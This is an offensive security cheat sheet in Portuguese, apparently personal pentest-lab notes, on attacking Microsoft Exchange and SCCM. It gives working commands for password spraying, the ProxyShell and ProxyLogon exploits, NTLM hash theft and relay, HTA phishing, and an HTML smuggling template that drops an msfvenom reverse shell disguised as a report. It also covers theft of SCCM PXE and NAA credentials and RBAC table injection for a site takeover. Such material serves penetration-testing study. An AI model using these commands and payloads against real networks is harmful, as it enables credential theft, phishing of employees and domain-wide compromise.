---
layout: cyber
section: sql-server
title: "Exchange e SCCM Attacks"
---

# Exchange e SCCM Attacks

## Email Para Todos, Execução em Toda a Frota

Exchange e SCCM são dois dos alvos mais valiosos em ambientes corporativos Windows. Exchange hospeda todos os emails da organização — incluindo credenciais, documentos sensíveis e acesso a comunicações internas. SCCM (System Center Configuration Manager) gerencia a implantação de software e configurações em toda a rede, de modo que comprometer o SCCM equivale a comprometer todos os endpoints gerenciados.

Exchange é crítico porque permite acesso a emails de toda a organização, expõe a Global Address List (GAL) como lista completa de usuários para ataques de spray, habilita phishing interno via caixa de email comprometida, carrega múltiplas CVEs críticas (ProxyShell, ProxyLogon) com impacto de RCE pré-autenticado, e permite captura de hashes NTLM via links SMB embutidos em emails. SCCM é crítico porque as Network Access Accounts (NAA) armazenam credenciais de domínio em texto claro após deobfuscação, Client Push Accounts têm admin local em todos os endpoints gerenciados, PXE boot pode vazar credenciais via mídia não protegida, e o backend MSSQL do SCCM é um vetor de takeover via relay de autenticação. Ambos aparecem após obter acesso inicial à rede interna e amplificam o impacto de credenciais de baixo privilégio para comprometimento total do domínio.

---

## Exchange Attacks

### Teoria e Enumeração

#### Protocolos e Componentes do Exchange

O Microsoft Exchange expõe múltiplos protocolos de acesso, cada um com superfície de ataque distinta:

| Protocolo | Porta | Descrição |
|-----------|-------|-----------|
| OWA (Outlook Web App) | 443 | Interface web para email |
| EWS (Exchange Web Services) | 443 | API SOAP para integração |
| MAPI/HTTP | 443 | Protocolo nativo do Outlook |
| ActiveSync (EAS) | 443 | Sincronização mobile |
| AutoDiscover | 443 | Descoberta automática de configuração |
| ECP (Exchange Control Panel) | 443 | Painel administrativo |

**Componentes importantes:**
- **Global Address List (GAL)**: Diretório de todos os usuários do Exchange. Acessível via OWA após autenticação. Fonte excelente de usernames para spray.
- **Outlook Rules**: Regras de email que podem executar ações — abusável para persistência ou movimentação lateral.
- **ECP**: Painel admin do Exchange em `/ecp/`. Versão visível via URL de exporttool.

#### Enumeração de Versão e Endpoints NTLM

Antes de qualquer ataque, mapear a versão e endpoints disponíveis:

```bash
# Descobrir versão do Exchange via ECP exporttool
curl https://10.129.230.37/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | \
  xmllint --format - | grep version

# Alternativa com grep
curl https://EXCHANGE_IP/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | \
  grep -i version
```

**Versões mapeadas:**
- Exchange 2013 CU23: 15.0.1497.x
- Exchange 2016 CU23: 15.1.2507.x
- Exchange 2019 CU13: 15.2.1258.x

```bash
# Enumerar endpoints NTLM com ntlmscan
git clone https://github.com/nyxgeek/ntlmscan
cd ntlmscan
python3 ntlmscan.py --host https://10.129.231.81

# Enumerar com nmap (endpoint EWS)
sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 10.129.231.81

# Verificar se OWA está acessível
curl -k -s -o /dev/null -w "%{http_code}" https://EXCHANGE_IP/owa/
```

**Resposta do ntlmscan inclui:** NetBIOS domain, NetBIOS computer name, DNS domain name — útil para confirmar o ambiente AD.

#### Geração de Usernames

GAL não acessível sem credenciais? Gerar usernames a partir de nomes conhecidos:

```bash
# Instalar username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Listar formatos disponíveis
./username-anarchy --list-formats

# Gerar a partir de arquivo com nomes completos (formato: Nome Sobrenome)
./username-anarchy --input-file ./names.txt

# Gerar para um único nome
./username-anarchy "John Smith"

# Especificar formato (ex: primeiro.ultimo)
./username-anarchy --format first.last "John Smith"
```

**Arquivo names.txt exemplo:**
```
John Smith
Jane Doe
Bob Johnson
```

#### Extração da Global Address List (GAL)

**Linux — emailextract.py:**

```bash
# Baixar script
wget -q https://raw.githubusercontent.com/pigeonburger/global-address-list-owa/main/emailextract.py

# IMPORTANTE: Script pode falhar em ambientes com SSL self-signed
# Adicionar bypass SSL: encontrar linha com requests.get e adicionar verify=False
# Editar emailextract.py antes de executar

# Executar extração via OWA
python3 emailextract.py -i exch01.inlanefreight.local \
  -u htb-student@inlanefreight.local \
  -p 'HTB_@cademy_stdnt!'

# Saída: lista de emails do GAL
```

**Windows — MailSniper:**

```powershell
# Carregar MailSniper em memória
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.228:8000/MailSniper.ps1')

# Extrair GAL via OWA (fallback automático para EWS se OWA falhar)
Get-GlobalAddressList -ExchHostname exch01.inlanefreight.local `
  -Username htb-student `
  -Password 'HTB_@cademy_stdnt!' `
  -OutFile globaladdresslist.txt

# Verificar arquivo gerado
Get-Content globaladdresslist.txt | head -20
```

**O que extrair da GAL:** Endereços de email completos. Extrair a parte antes do `@` para lista de usernames. Exemplo: `john.smith@inlanefreight.local` → username `john.smith`.

#### Política de Lockout

**VERIFICAR ANTES DE SPRAY** para evitar lock de contas:

```powershell
# Via PowerView (em domínio)
(Get-DomainPolicy)."SystemAccess"

# Via LDAP (sem PowerView)
Get-ADDefaultDomainPasswordPolicy

# Campos importantes:
# LockoutBadCount = 0 significa sem lockout
# LockoutBadCount = 5 significa bloquear após 5 tentativas erradas
# LockoutObservationWindow = janela de reset do contador
```

**Regra de ouro:** Se `LockoutBadCount` > 0, respeitar o limite. Tentar 1-2 senhas por usuário, esperar `LockoutObservationWindow` antes de nova tentativa.

#### Password Spray

**Linux — Ruler:**

```bash
# Baixar Ruler
wget https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-linux64
chmod +x ruler-linux64

# Spray via AutoDiscover
./ruler-linux64 --domain inlanefreight.local \
  --insecure \
  brute \
  --users global_address_list.txt \
  --passwords passwords.txt \
  --verbose \
  -a 4

# -a 4 = agressividade (requests por segundo)
# --insecure = ignorar erros SSL
```

**Windows — MailSniper:**

```powershell
# Spray via OWA
Invoke-PasswordSprayOWA -ExchHostname exch01.inlanefreight.local `
  -UserList .\usernames.txt `
  -Password "Inlanefreight2024!" `
  -OutFile creds.txt

# Spray via EWS
Invoke-PasswordSprayEWS -ExchHostname exch01.inlanefreight.local `
  -UserList .\usernames.txt `
  -Password "Inlanefreight2024!"

# Verificar credenciais válidas no arquivo de saída
Get-Content creds.txt
```

**Senhas comuns para spray:** `Empresa2024!`, `Welcome1!`, `Password123!`, `SeasonYear!` (ex: `Winter2024!`), nome da empresa + ano + símbolo.

---

### Na Prática

#### Cenário 1: ProxyShell (CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207)

ProxyShell é uma cadeia de 3 CVEs descoberta por Orange Tsai (2021) que resulta em RCE pré-autenticado como `NT AUTHORITY\SYSTEM`. Afeta Exchange 2013, 2016 e 2019 sem patches de maio/julho 2021.

**Como funciona:**
1. **CVE-2021-34473** (Path Confusion): Endpoint `/autodiscover/` aceita email no path como contexto de autenticação. Atacante usa email de admin em URL para elevar privilégios via backend PowerShell do Exchange.
2. **CVE-2021-34523** (Backend Elevation): SYSTEM passa email de admin para o backend, permitindo acesso ao PowerShell do Exchange como qualquer usuário.
3. **CVE-2021-31207** (Arbitrary File Write): `New-MailboxExportRequest` com `-FilePath` permite escrever arquivo .aspx em diretório web acessível → webshell.

**Exploração com Proxyshell-Exchange:**

```bash
# Clonar exploit
git clone https://github.com/mr-r3bot/Proxyshell-Exchange
cd Proxyshell-Exchange

# Executar (requer apenas IP e email de admin válido)
python3 proxyshell.py -u https://10.129.230.42/ -e administrator@inlanefreight.local

# Saída esperada:
# [+] Backend cookie: X-BackendCookie=...
# [+] Webshell deployed at: https://10.129.230.42/aspnet_client/[random].aspx
# [+] Shell prompt appears

# Verificar webshell manualmente se necessário
curl -k "https://10.129.230.42/aspnet_client/[random].aspx?cmd=whoami"
```

**Indicadores de sucesso:** Arquivo `.aspx` criado em `C:\inetpub\wwwroot\aspnet_client\`. Execução como `NT AUTHORITY\SYSTEM`.

#### Cenário 2: ProxyLogon (CVE-2021-26855)

Vulnerabilidade de SSRF pré-autenticada que permite bypass de autenticação e leitura arbitrária de arquivos. Frequentemente encadeada com CVE-2021-27065 (post-auth file write) para RCE.

```bash
# Ferramentas disponíveis
# 1. PoC original: https://github.com/praetorian-inc/proxylogon-exploit
# 2. Metasploit: use exploit/windows/http/exchange_proxylogon_rce

# Via Metasploit
msfconsole -q
use exploit/windows/http/exchange_proxylogon_rce
set RHOSTS 10.129.230.42
set LHOST 10.10.14.207
run
```

#### Cenário 3: Captura de Hash NTLM via Email

Se o Exchange não está vulnerável a ProxyShell/ProxyLogon mas há acesso a uma caixa de email comprometida, enviar emails com links que forçam autenticação NTLM.

**Método 1 — Link SMB direto:**

```bash
# Iniciar Responder
sudo responder -I tun0

# Enviar email com link SMB (via MailSniper ou interface web)
# Corpo do email: <img src="\\10.10.14.80\share\image.png">
# Ou: Clique aqui: \\10.10.14.80\share\document.txt
# Quando vítima abre email/preview, Windows tenta autenticar via SMB
# Responder captura o hash NTLMv2
```

**Método 2 — ntlm_theft (múltiplos formatos):**

```bash
# Instalar ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft

# Listar tipos suportados
python3 ntlm_theft.py --help

# Gerar arquivo HTM (bom para email HTML)
python3 ntlm_theft.py -g htm -s 10.10.14.80 -f student

# Gerar todos os tipos de uma vez
python3 ntlm_theft.py -g all -s 10.10.14.80 -f student

# Tipos gerados incluem: .htm, .docx, .xlsx, .pdf, .url, .lnk, etc.
# Cada um usa técnica diferente para forçar autenticação NTLM

# Iniciar Responder para capturar
sudo responder -I tun0 -v

# Hash capturado no formato: user::DOMAIN:challenge:hash
# Crackear com hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

**CVE-2023-23397 (Outlook Calendar Reminder):**

```bash
# Vulnerabilidade no som de lembrete do calendário
# Criar evento de calendário com caminho UNC como som de lembrete
# Não requer interação do usuário — apenas receber o convite é suficiente

# Ferramenta: https://github.com/api0cradle/CVE-2023-23397-POC-Powershell
python3 CVE-2023-23397.py --email victim@domain.com --server EXCHANGE_IP \
  --attacker_ip 10.10.14.80
```

#### Cenário 4: Phishing Interno via Caixa Comprometida

Com acesso a caixa de email interna (via credenciais capturadas), phishing tem alta taxa de sucesso por vir de remetente confiável.

**Método 1 — HTA via Metasploit:**

```bash
# Iniciar servidor HTA malicioso
msfconsole -x "use exploit/windows/misc/hta_server; \
  set LHOST 10.10.14.207; \
  set LPORT 8443; \
  set SRVHOST 10.10.14.207; \
  run -j"

# Saída: URL do HTA, ex: http://10.10.14.207:8080/[random].hta
# Enviar link no email: "Clique para ver o relatório: http://10.10.14.207:8080/[random].hta"
# Vítima clica → mshta.exe executa → shell reverso
```

**Método 2 — HTML Smuggling:**

HTML Smuggling usa JavaScript para criar e baixar arquivo malicioso no navegador da vítima, bypassando filtros de email que bloqueiam anexos executáveis.

```bash
# Gerar payload
msfvenom -p windows/shell/reverse_tcp \
  LHOST=10.10.14.92 \
  LPORT=9001 \
  -f exe > shell.exe

# Encodar em base64
base64 -w0 shell.exe > shell.b64
cat shell.b64
```

Template HTML para smuggling:
```html
<html>
<body>
<script>
  // Payload base64 do msfvenom
  var base64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA...";

  // Decodificar e criar blob
  var bytes = atob(base64);
  var byteArray = new Uint8Array(bytes.length);
  for (var i = 0; i < bytes.length; i++) {
    byteArray[i] = bytes.charCodeAt(i);
  }
  var blob = new Blob([byteArray], {type: "application/octet-stream"});

  // Forçar download automático
  var link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "Relatorio_Financeiro_2024.exe";
  document.body.appendChild(link);
  link.click();
</script>
<p>Carregando relatório, aguarde...</p>
</body>
</html>
```

```bash
# Iniciar listener multi/handler
msfconsole -x "use multi/handler; \
  set payload windows/shell/reverse_tcp; \
  set LHOST 10.10.14.92; \
  set LPORT 9001; \
  run"
```

---

### Comandos e Ferramentas

#### Referência Rápida — Exchange

```bash
# === ENUMERAÇÃO ===

# Versão do Exchange
curl -k https://EXCHANGE_IP/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application | \
  xmllint --format - | grep version

# Endpoints NTLM
python3 ntlmscan.py --host https://EXCHANGE_IP
sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 EXCHANGE_IP

# === GERAÇÃO DE USERNAMES ===
./username-anarchy --input-file names.txt
./username-anarchy --list-formats

# === GAL EXTRACTION ===
# Linux
python3 emailextract.py -i EXCHANGE_HOST -u user@domain -p 'Password'

# Windows
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/MailSniper.ps1')
Get-GlobalAddressList -ExchHostname EXCHANGE_HOST -Username user -Password 'pass' -OutFile gal.txt

# === POLÍTICA DE LOCKOUT ===
(Get-DomainPolicy)."SystemAccess"

# === PASSWORD SPRAY ===
# Linux
./ruler-linux64 --domain DOMAIN --insecure brute --users users.txt --passwords passwords.txt --verbose -a 4

# Windows OWA
Invoke-PasswordSprayOWA -ExchHostname EXCHANGE_HOST -UserList users.txt -Password "Pass2024!" -OutFile creds.txt

# Windows EWS
Invoke-PasswordSprayEWS -ExchHostname EXCHANGE_HOST -UserList users.txt -Password "Pass2024!"

# === PROXYSHELL ===
python3 proxyshell.py -u https://EXCHANGE_IP/ -e admin@domain.local

# === HASH THEFT ===
# ntlm_theft
python3 ntlm_theft.py -g all -s ATTACKER_IP -f document
sudo responder -I tun0 -v

# Hashcat para crackear NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# === PHISHING HTA ===
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST ATTACKER_IP; set LPORT 8443; run -j"

# === PAYLOAD HTML SMUGGLING ===
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f exe > shell.exe
base64 -w0 shell.exe
# Embedar base64 em HTML blob JavaScript
```

#### Ferramentas Exchange

| Ferramenta | Tipo | Uso Principal |
|------------|------|---------------|
| MailSniper | PowerShell | GAL extraction, password spray, email search |
| Ruler | Linux binary | AutoDiscover brute force |
| ntlmscan | Python3 | Enumerar endpoints NTLM |
| ntlm_theft | Python3 | Gerar documentos para captura de hash |
| username-anarchy | Ruby | Gerar variações de usernames |
| emailextract.py | Python3 | GAL extraction via OWA |
| Proxyshell-Exchange | Python3 | Exploração ProxyShell |
| Responder | Python3 | Capturar hashes NTLM/NTLMv2 |
| msfvenom | Metasploit | Gerar payloads |

---

## SCCM Attacks

### Teoria e Enumeração

#### O Que é SCCM / MECM

**System Center Configuration Manager (SCCM)**, também conhecido como **Microsoft Endpoint Configuration Manager (MECM)** ou **ConfigMgr**, é a solução da Microsoft para gerenciamento centralizado de endpoints em ambientes corporativos.

**Funcionalidades principais:**
- Implantação de software e patches em toda a frota
- Inventário de hardware e software
- Configuração de sistemas operacionais
- Deploy de imagens via PXE boot
- Relatórios de conformidade

**Por que é alvo prioritário:** Controlar o SCCM = capacidade de executar código em todos os endpoints gerenciados da organização.

#### Arquitetura do SCCM

```
┌─────────────────────────────────────────────────────┐
│                   Active Directory                   │
│          (System Management Container)               │
└──────────────────────┬──────────────────────────────┘
                       │
              ┌────────▼────────┐
              │  Primary Server  │ ← SMS Provider, WSUS
              │  (Site Server)   │
              └───────┬─────────┘
                      │
         ┌────────────┼────────────┐
         │            │            │
    ┌────▼────┐  ┌────▼────┐  ┌───▼──────────┐
    │  MSSQL  │  │  Dist.  │  │  Management  │
    │ Database│  │  Point  │  │    Point     │
    │  (CM_*) │  │  (DP)   │  │    (MP)      │
    └─────────┘  └─────────┘  └──────────────┘
                      │
              ┌───────▼───────┐
              │ PXE Boot      │
              │ (network boot)│
              └───────────────┘
```

**Componentes críticos:**
- **Primary Server**: Servidor central que hospeda SMS Provider e console de administração
- **MSSQL Site Database**: Banco de dados com prefixo `CM_` (ex: `CM_HTB`). Contém tabelas RBAC, inventário, configurações
- **Distribution Point (DP)**: Hospeda pacotes de software e imagens PXE
- **Management Point (MP)**: Ponto de comunicação dos clientes SCCM com o servidor

#### Métodos de Implantação de Clientes

| Método | Segurança | Observação |
|--------|-----------|------------|
| **Client Push Installation** | Baixa (padrão) | Usa conta de serviço com admin local → alvo para coerção NTLM |
| Software Update | Média | Via WSUS |
| Group Policy | Média | Via GPO |
| Manual | Alta | Admin instala manualmente |
| Logon Script | Baixa | Script de logon |
| Package and Program | Média | Pacote de distribuição |

**Client Push Installation** é o método padrão e o menos seguro. A conta de serviço usada (Client Push Account) tem admin local em todos os endpoints → capturar essas credenciais = acesso massivo.

#### Credenciais Armazenadas no SCCM

O SCCM armazena credenciais em 3 locais:

1. **Device Collection Variables**: Variáveis de coleção de dispositivos, podem conter senhas para scripts de configuração
2. **Task Sequence Variables**: Variáveis de sequência de tarefas (deploy de OS), frequentemente contêm credenciais de domínio e credenciais de join de domínio
3. **Network Access Accounts (NAA)**: Contas de serviço usadas pelos clientes SCCM para acessar conteúdo no Distribution Point quando não estão autenticados no domínio. Armazenadas cifradas com DPAPI + chave da máquina.

**NAA é o alvo principal** porque:
- Frequentemente são contas de domínio com privilégios elevados
- Armazenadas em todos os clientes SCCM (WMI repository ou arquivo OBJECTS.DATA)
- Recuperáveis mesmo sem admin no servidor central

#### Enumeração via LDAP — sccmhunter

```bash
# Instalar sccmhunter
git clone https://github.com/garrettfoster13/sccmhunter
cd sccmhunter
pip3 install -r requirements.txt

# Módulo find: enumeração LDAP
# Busca: System Management container, strings SCCM/MECM, Management Points
python3 sccmhunter.py find \
  -u blwasp \
  -p 'Password123!' \
  -d lab.local \
  -dc-ip 172.50.0.10

# Exibir resultados
python3 sccmhunter.py show -all
# Tabelas: SiteServers, ManagementPoints, Users, Groups, Computers

# Módulo smb: profiling dos servidores SCCM via SMB
# Valida conectividade, checa SMB signing, identifica roles de site system
python3 sccmhunter.py smb \
  -u blwasp \
  -p 'Password123!' \
  -d lab.local \
  -dc-ip 172.50.0.10 \
  -save
# -save: exporta resultados para arquivo
```

**O que procurar no LDAP:**
- Container `CN=System Management,CN=System,DC=domain,DC=local` com objeto do servidor SCCM
- Computadores com `msSMSSitecode` ou strings "SCCM"/"MECM"/"ConfigMgr" no nome ou descrição
- Grupos relacionados: "SMS Admins", "SCCM Admins", "ConfigMgr"

#### Enumeração com SharpSCCM (C#)

SharpSCCM é alternativa em C# para ambientes onde Python não está disponível:

```powershell
# Enumerar Management Points via LDAP
.\SharpSCCM.exe get management-points

# Enumerar dispositivos
.\SharpSCCM.exe get devices

# Enumerar usuários administradores do SCCM
.\SharpSCCM.exe get admins

# Enumerar credenciais (NAA)
.\SharpSCCM.exe get secrets

# Executar CMPivot (requer admin SCCM)
.\SharpSCCM.exe invoke admin-service -r "select * from SMS_R_System"
```

#### Túnel com Ligolo-ng

Se a rede SCCM está em sub-rede interna (ex: `172.50.0.0/24`) não diretamente acessível:

```bash
# === ATACANTE (Linux) ===

# Baixar e configurar proxy
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

# Iniciar proxy (porta padrão 11601)
./proxy -selfcert

# === ALVO COMPROMETIDO (Windows) ===
# Baixar agente e conectar ao proxy
.\agent.exe --ignore-cert -connect 10.10.14.207:11601

# === DE VOLTA NO ATACANTE (ligolo-ng console) ===
# Listar sessões
session

# Selecionar sessão ativa (numero)
1

# Criar interface de tunelamento
interface_create --name internal1

# Iniciar túnel
tunnel_start --tun internal1

# Adicionar rota (fora do ligolo-ng, novo terminal)
sudo ip route add 172.50.0.0/24 dev internal1

# Testar conectividade
ping 172.50.0.10
proxychains4 -q python3 sccmhunter.py find -u user -p pass -d lab.local -dc-ip 172.50.0.10
```

---

### Na Prática

#### Ataque 1: PXE Boot — Captura de Credenciais

PXE (Pre-Boot Execution Environment) permite que máquinas façam boot pela rede. O Distribution Point serve imagens de OS via TFTP. Se a mídia PXE não está protegida por senha, atacante pode recuperar variáveis de sequência de tarefas contendo credenciais.

**Pré-requisito:** Acesso à rede onde o DP responde a PXE requests (geralmente rede interna).

**Ferramenta:** PXEThief (Python, Windows only, requer pywin32 + Python 3.10)

```powershell
# === No Windows alvo ou VM Windows na mesma rede ===

# Instalar dependências
pip install pywin32

# Opção 2: Coerção de PXE boot de DP específico
# Isso simula um boot PXE e força o DP a enviar boot.var
python .\pxethief.py 2 172.50.0.30

# Arquivo boot.var será baixado via TFTP automaticamente
# Nome do arquivo: YYYY.MM.DD.HH.MM.SS.0001.{GUID}.boot.var

# Opção 5: Computar hash crackável a partir do boot.var
python .\pxethief.py 5 '.\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var'

# Hash gerado no formato: $sccm$aes128$...
```

**Compilar módulo hashcat 19850 para crackear:**

```bash
# === No Linux (atacante) ===
mkdir hashcat_pxe && cd hashcat_pxe

# Clonar hashcat e módulo SCCM
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module

# Copiar módulo
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/

# Compilar versão específica
cd hashcat
git checkout -b v6.2.5 tags/v6.2.5
make

# Crackear hash PXE
./hashcat -m 19850 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Resultado: senha em texto claro
```

**Descriptografar variáveis e extrair credenciais:**

```powershell
# Opção 3: descriptografar boot.var com senha crackada
python .\pxethief.py 3 '.\2024.05.19.13.06.09.0001.{GUID}.boot.var' 'Password123!'

# Saída contém:
# - NAA credentials (Network Access Account)
# - Task Sequence credentials (ex: domain join account)
# - Outros dados sensíveis da sequência de tarefas
```

#### Ataque 2: Extração de NAA via DPAPI (com Admin no Servidor SCCM)

Se há privilégios de admin no servidor SCCM (direta ou via relay), usar sccmhunter para extrair NAA credentials descriptografadas.

```bash
# Método WMI: acessar WMI repository no servidor SCCM
python3 sccmhunter.py dpapi \
  -u rai \
  -p 'Threathunting01' \
  -d lab.local \
  -dc-ip 172.50.0.10 \
  -target 172.50.0.21 \
  -wmi

# Método disk: acessar arquivo OBJECTS.DATA diretamente
python3 sccmhunter.py dpapi \
  -u rai \
  -p 'Threathunting01' \
  -d lab.local \
  -dc-ip 172.50.0.10 \
  -target 172.50.0.21 \
  -disk

# Ambos os métodos
python3 sccmhunter.py dpapi \
  -u rai \
  -p 'Threathunting01' \
  -d lab.local \
  -dc-ip 172.50.0.10 \
  -target 172.50.0.21 \
  -both

# Saída: credenciais NAA em texto claro
# Exemplo: NAA Account: lab\svc_sccm_naa | Password: SuperSecretPass123!
```

**Onde as credenciais NAA ficam no cliente SCCM:**
- WMI: `root\ccm\policy\machine\actualconfig` namespace, classe `CCM_NetworkAccessAccount`
- Arquivo: `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`

#### Ataque 3: Extração de NAA via Fake Machine Enrollment (Sem Admin)

Este é o ataque mais poderoso — requer apenas permissão para criar contas de máquina no domínio (padrão para qualquer usuário autenticado, quota de 10 máquinas por padrão).

**Como funciona:** Criar conta de máquina falsa → registrar como cliente SCCM → o servidor SCCM entrega as políticas de NAA para o "novo cliente" → sccmhunter deobfusca automaticamente.

```bash
# === Passo 1: Criar conta de máquina no domínio ===
# Usar addcomputer.py (Impacket)
python3 addcomputer.py \
  -computer-name 'PWNED$' \
  -computer-pass 'ComputerPass123' \
  -dc-ip 172.50.0.10 \
  'LAB.LOCAL/Blwasp:Password123!'

# Verificar criação
python3 GetADUsers.py -all 'LAB.LOCAL/Blwasp:Password123!' -dc-ip 172.50.0.10 | grep PWNED

# === Passo 2: Registrar como cliente SCCM e extrair NAA ===
python3 sccmhunter.py http \
  -u blwasp \
  -p 'Password123!' \
  -dc-ip 172.50.0.10 \
  -cn 'PWNED$' \
  -cp 'ComputerPass123' \
  -debug

# Opção automática: cria máquina e recupera políticas em um comando
python3 sccmhunter.py http \
  -u blwasp \
  -p 'Password123!' \
  -dc-ip 172.50.0.10 \
  -auto

# Saída: credenciais NAA em texto claro sem necessitar de admin no servidor SCCM
```

**Processo interno do sccmhunter http:**
1. Registra máquina com o Management Point via HTTP
2. Solicita políticas de cliente
3. O MP retorna políticas cifradas (incluindo NAA) — cifradas com chave derivada da conta de máquina
4. sccmhunter deobfusca usando a chave conhecida da máquina criada

#### Ataque 4: Client Push Exploitation (Coerção NTLM)

O método Client Push força o servidor SCCM a conectar ao alvo para instalar o cliente. A conta de serviço usada (frequentemente com admin local em toda a frota) autentica via NTLM → capturável.

**Pré-requisitos para o ataque:**
- Patch KB15599094 NÃO aplicado
- NTLM não desabilitado na rede
- SCCM não configurado para HTTPS com PKI
- SCCM não configurado para Enhanced HTTP

```powershell
# === Windows — SharpSCCM + Inveigh ===

# Terminal 1: Iniciar Inveigh para capturar NTLM
.\Inveigh.exe

# Terminal 2: Forçar Client Push para IP controlado (ou alvo)
.\SharpSCCM.exe invoke client-push -t 172.50.0.51

# Inveigh captura NTLMv2 da Client Push Account
# Hash no formato: user::DOMAIN:challenge:hash

# Crackear com hashcat
hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt

# Ou relay via ntlmrelayx (sem crackear)
# Em atacante Linux: python3 ntlmrelayx.py -t smb://TARGET_IP -smb2support
# No Windows: .\SharpSCCM.exe invoke client-push -t ATTACKER_IP
```

#### Ataque 5: SCCM Site Takeover via NTLM Relay ao MSSQL

Este é o ataque mais impactante: comprometer o servidor SCCM completo via relay de autenticação para o banco MSSQL.

**Condição:** Primary Server MSSQL database está em servidor separado E a conta de máquina do Primary Server tem admin local no servidor de banco de dados.

```bash
# === ATACANTE (Linux) ===

# Passo 1: Configurar ntlmrelayx para relay ao MSSQL
cd impacket
source .impacket/bin/activate

python3 examples/ntlmrelayx.py \
  -t "mssql://172.50.0.30" \
  -smb2support \
  -socks

# Passo 2: Forçar autenticação do Primary Server via PetitPotam
# Em outro terminal
python3 PetitPotam.py \
  -u BlWasp \
  -p 'Password123!' \
  -d 'lab.local' \
  10.10.14.207 \
  172.50.0.21

# 172.50.0.21 = Primary Server (forçado a autenticar para atacante)
# 10.10.14.207 = IP do atacante (onde ntlmrelayx escuta)

# ntlmrelayx recebe autenticação do Primary Server e a relaya para MSSQL 172.50.0.30
# Abre conexão SOCKS com a sessão autenticada

# Passo 3: Conectar via proxychains ao MSSQL (usando sessão relayada)
proxychains4 -q python3 examples/mssqlclient.py \
  'LAB/SCCM01$@172.50.0.30' \
  -windows-auth \
  -no-pass

# Passo 4: Modificar tabelas RBAC para conceder admin ao usuário controlado
SQL> use CM_HTB
SQL> SELECT * FROM RBAC_Admins
# Verificar estrutura

# Inserir usuário controlado como admin SCCM completo
SQL> INSERT INTO RBAC_Admins (AdminID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
     VALUES (16777235, 'LAB\blwasp', 0, 0, '', getdate(), '', getdate(), 'HTB')

SQL> SELECT * FROM RBAC_ExtendedPermissions
# Verificar permissões existentes para copiar estrutura

# Inserir permissões completas (copiar do admin existente)
SQL> INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
     SELECT 16777235, RoleID, ScopeID, ScopeTypeID
     FROM RBAC_ExtendedPermissions
     WHERE AdminID = [ID_DO_ADMIN_EXISTENTE]

# Verificar acesso
SQL> SELECT LogonName FROM RBAC_Admins WHERE LogonName LIKE '%blwasp%'
```

**Resultado:** Usuário `LAB\blwasp` agora tem acesso administrativo total ao console SCCM → pode implantar software/scripts em todos os endpoints gerenciados → RCE em toda a frota.

**Alternativa com PetitPotam — SpoolSample/PrinterBug:**

```bash
# Alternativa ao PetitPotam: SpoolSample
python3 SpoolSample.py 172.50.0.21 10.10.14.207

# Alternativa: coerção via DDR enrollment (SharpSCCM)
.\SharpSCCM.exe invoke new-device -d 172.50.0.21 -mp 172.50.0.21
```

---

### Comandos e Ferramentas

#### Referência Rápida — SCCM

```bash
# === ENUMERAÇÃO ===

# LDAP discovery
python3 sccmhunter.py find -u user -p pass -d domain.local -dc-ip DC_IP
python3 sccmhunter.py show -all

# SMB profiling
python3 sccmhunter.py smb -u user -p pass -d domain -dc-ip DC_IP -save

# SharpSCCM
.\SharpSCCM.exe get management-points
.\SharpSCCM.exe get devices
.\SharpSCCM.exe get admins
.\SharpSCCM.exe get secrets

# === LIGOLO-NG TUNNEL ===
./proxy -selfcert                                      # Atacante
.\agent.exe --ignore-cert -connect ATTACKER:11601      # Alvo Windows
# Interface: interface_create --name internal1
# Tunnel: tunnel_start --tun internal1
sudo ip route add 172.50.0.0/24 dev internal1          # Rota

# === PXE BOOT ATTACK ===
python pxethief.py 2 DP_IP                             # Coerção PXE
python pxethief.py 5 'file.boot.var'                   # Hash
hashcat -m 19850 --force -a 0 hash.txt rockyou.txt    # Crack
python pxethief.py 3 'file.boot.var' 'Password123!'   # Decrypt + NAA

# === NAA VIA DPAPI (admin) ===
python3 sccmhunter.py dpapi -u user -p pass -d domain -dc-ip DC_IP -target SCCM_IP -wmi
python3 sccmhunter.py dpapi -u user -p pass -d domain -dc-ip DC_IP -target SCCM_IP -disk

# === NAA VIA FAKE MACHINE (sem admin) ===
python3 addcomputer.py -computer-name 'PWNED$' -computer-pass 'Pass123' -dc-ip DC_IP 'DOMAIN/User:Pass'
python3 sccmhunter.py http -u user -p pass -dc-ip DC_IP -cn 'PWNED$' -cp 'Pass123'
python3 sccmhunter.py http -u user -p pass -dc-ip DC_IP -auto

# === CLIENT PUSH COERCION ===
.\Inveigh.exe                                          # Terminal 1
.\SharpSCCM.exe invoke client-push -t TARGET_IP        # Terminal 2
